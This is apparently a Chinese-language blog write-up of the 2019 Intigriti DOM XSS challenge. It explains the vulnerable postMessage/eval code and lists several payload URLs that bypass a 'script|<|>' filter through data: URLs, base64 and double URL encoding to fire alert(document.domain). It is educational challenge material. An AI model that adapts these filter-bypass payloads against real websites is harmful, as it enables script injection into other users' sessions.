---
layout: post
title: Intigriti XSS 解题思路总结
date: 2019-05-15 20:58
tags:
- xss
- web
categories: web
description: 一道有趣的 xss 挑战题目
---
最近 intigriti 举办了一场非常有趣的 XSS 挑战题目，题目地址如下：

[https://challenge.intigriti.io](https://challenge.intigriti.io)

题目描述：

> Try to exploit a DOM XSS vulnerability on this page to trigger a popup of the document.domain (**challenge.intigriti.io**).
> The winner gets a **Burp License (1 year), an exclusive swag package and invitations to private programs**.

做题这需要在当前页面成功执行 alert(document.domain) 命令，挑战页面涉及的代码很简短如下：

```javascript
  <!-- challenge -->
  <script>
  const url = new URL(decodeURIComponent(document.location.hash.substr(1))).href.replace(/script|<|>/gi, "forbidden");
  const iframe = document.createElement("iframe"); iframe.src = url; document.body.appendChild(iframe);
  iframe.onload = function(){ window.addEventListener("message", executeCtx, false);}
  function executeCtx(e) {
    if(e.source == iframe.contentWindow){
      e.data.location = window.location;
      Object.assign(window, e.data);
      eval(url);
    }
  }
  </script>
  <!-- challenge -->
```

自己测试的时候注意一定要把这段 js 代码放到 body dom 建立好之后

### 解题思路

首先，我用文字描述一下题目的逻辑：

当前网页 hash 部分内容是需要解题者精心构造 Payload 的区域，js 会读取 hash 部分建立一个 URL 对象，并把 href 属性内容随后赋值给新建的 frame.src，解题者需要 frame 里执行 js，以发送给主页 window 窗口 message 消息 js 触发 addEventListener 监听器执行 executeCtx，其中 `e.source == iframe.contentWindow` 是判断消息是否来自 iframe 的窗口，并且要满足 executeCtx 内部成功执行到 eval(url) 不报错的条件，成功执行 alert(document.domain)。

几个问题如下，为什么不在 iframe 里弹出 alert(document.domain)？

```
iframe 是一个数据 URL 没有 domain，同时 iframe 的 js 得不到主页窗口的 document.domain 内容
```

后面的解题为什么非要使用 data 伪协议，iframe 加载外部 js 不行吗？

> https://stackoverflow.com/questions/15329710/postmessage-source-iframe
> 如果只是验证是否是 iframe 发送的，为什么不加载外部 js？

本题需要充分的利用 JS 调试器，推荐 Chrome

### 基础知识

1. Data URLs，即前缀为 data: 协议的的 URL，其允许内容创建者向文档中嵌入小文件。

   ```
   data:[<mediatype>][;base64],<data>
   ```

   mediatype 是个 MIME 类型的字符串，例如 "image/jpeg" 表示 JPEG 图像文件。如果被省略，则默认值为 text/plain;charset=US-ASCII

   参考文档：[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/data_URIs](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/data_URIs)

   mediatype 为 `text/html` 就足够执行 js，比如执行 `<script>alert('hi');</script>`，浏览器打开下面链接即可。

   ```
   data:text/html;base64,PHNjcmlwdD5 hbGVydCgnaGknKTs8L3NjcmlwdD4=
   ```

2. 如何发送 message，以及 receiveMessage 函数的参数 e 的属性

   js 可以使用 postMessage() 发送消息，会触发绑定了 'message' 事件的 Listener，使用方法如下：

   ```
   targetWindow.postMessage(messageData, targetOrigin, [transfer]);
   ```

   > **targetWindow**
   >
   > A reference to the window that will receive the message. Methods for obtaining such a reference include:
   >
   > - [`window.open`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) (to spawn a new window and then reference it),
   > - [`window.opener`](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) (to reference the window that spawned this one),
   > - [`HTMLIFrameElement.contentWindow`](https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/contentWindow) (to reference an embedded [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) from its parent window),
   > - [`window.parent`](https://developer.mozilla.org/en-US/docs/Web/API/Window/parent) (to reference the parent window from within an embedded [``](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)), or
   > - [`window.frames`](https://developer.mozilla.org/en-US/docs/Web/API/Window/frames) + an index value (named or numeric).

   注意 targetwindow 是接受窗口索引。postMessage 是实现跨域通信非常好的一个接口。

   对于 receviveMessage 的参数 e 有这些属性：

   > data
   > The object passed from the other window.
   >
   > source
   > A reference to the window object that sent the message; you can use this to establish two-way communication between two windows with different origins.

   e.data 就是 postMessage 参数的 messageData

   参考文档：[https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

3. Object.assign(target, source) 方法用于将所有可枚举属性的值从一个或多个源对象复制到目标对象。它将返回目标对象。

   在本题中是将 message 携带的 e.data 的全部属性赋值给 window （如果 window 没有该属性会新建）

4. 题目的过滤正则表达式含义

   ```
   /script|<|>/gi   
   ```

   过滤 script 或者 < 或者 >，g 表示全局搜索，i 表示不区分大小写

5. iframe.contentWindow

   > contentWindow 属性返回 <iframe> 元素的 Window 对象。你可以使用这个 Window 对象来访问 iframe 的文档及其内部 DOM。contentWindow 为只读，但是可以像操作全局 Window 对象一样操作其属性。

6. window 对象

   > Window 对象表示一个浏览器窗口或一个框架。
   > Window 对象的 window 属性和 self 属性引用的都是它自己。当你想明确地引用当前窗口，而不仅仅是隐式地引用它时，可以使用这两个属性。除了这两个属性之外，parent 属性、top 属性以及 frame[] 数组都引用了与当前 Window 对象相关的其他 Window 对象。

### 解题步骤

1. 如何绕过 replace(/script|<|>/gi, "forbidden") 过滤
   - 方法一：data 协议的 base64 编码
   - 方法二：使用非 script 标签执行 js，利用二次 URL 编码绕过 < 和 > 的替换

下面给出几个 Payload 来研究：

```
https://challenge.intigriti.io/#data:text/html,alert(document.domain);//%253csvg%20onload=%22parent.postMessage({text:4,html:1},'*');%22%253e
URL 解码后：<svg onload="parent.postMessage({text:4,html:1},'*');">
```
上述 Payload 消息之所以要发送 `{text:4,html:1}` 是在 Object.assign 步骤使得主页 window 属性有 text 和 html，这样 eval 执行的时候就不会报错：

```
Uncaught ReferenceError: text is not defined
```

// 的作用是避免执行到后面的内容，比如上述 payload 如果没有 // 会触发 eval 报错：

```
Unexpected token %
```

特别的，注意：

```javascript
eval("data:1"); 正常   
eval("data"); 显示未定义
```

另一个 base64 方案的 payload 如下：

```
https://challenge.intigriti.io/#data:text/html;alert(document.domain);base64,PHNjcmlwdD53aW5kb3cucGFyZW50LnBvc3RNZXNzYWdlKHt0ZXh0OjEsIGh0bWw6MSwgYmFzZTY0OjF9LCAiKiIpPC9zY3JpcHQ+aGkgaW50aWdyaXRp
<script>window.parent.postMessage({text:1, html:1, base64:1}, "*")</script>hi intigriti
```

但是在我的 firefox 和 chrome 测试都失效，作者也有类似情况。

### 官方贴的 payload 测试情况：

成功的 payload：

```
https://challenge.intigriti.io/#data:text/html;var%20 text=text;var%20 html=html;alert(xss)//;base64,PGh0bWw+PGJvZHkgb25 sb2FkPXhzcygpPjxzY3JpcHQ+IGZ1bmN0aW9uIHhzcygpIHsgcGFyZW50LnBvc3RNZXNzYWdlKHsneHNzJzogIm4wdG0zIn0 sICcqJyk7IH07IDwvc2NyaXB0Pg==
```

```
https://challenge.intigriti.io/#data:text/html,alert()//%253Csvg/onload=%27 top.postMessage(%7 B%22 text%22:%201%7D,%20%22*%22);top.postMessage(%7 B%22 html%22:%201%7D,%20%22*%22)%27%253E
```

```
https://challenge.intigriti.io/#data:text/html;var%20 text=alert%28%29;var%20 html;base64,YWE8c3ZnL29ubG9 hZD0idG9wLnBvc3RNZXNzYWdlKDAsJyonKSI+11
```

```
https://challenge.intigriti.io/#data:text/html,alert(document.domain);//%253csvg%20onload=%22parent.postMessage({text:4,html:1},'*');%22%253e
```

测试失败的：

```
https://challenge.intigriti.io/#data:text/html,alert(document.domain)//%253C%2553cript%253Ewindow.parent.postMessage({text:%22%22,html:%22%22}%2C%20%22*%22)%253C%2F%2553cript%253E
```

### 参考链接

[https://blog.intigriti.com/2019/05/06/intigriti-xss-challenge-1/ ](https://blog.intigriti.com/2019/05/06/intigriti-xss-challenge-1/ ) 官方解答

[**Solution of Dominic**](https://dee-see.github.io/intigriti/xss/2019/05/02/intigriti-xss-challenge-writeup.html) 官方推荐的解答一

[**Solution of DPhoenixx**](https://twitter.com/dPhoeniixx/status/1124448847844061189) 官方推荐的解答二

[https://xz.aliyun.com/t/5106](https://xz.aliyun.com/t/5106) 国内选手解答——居然是抄的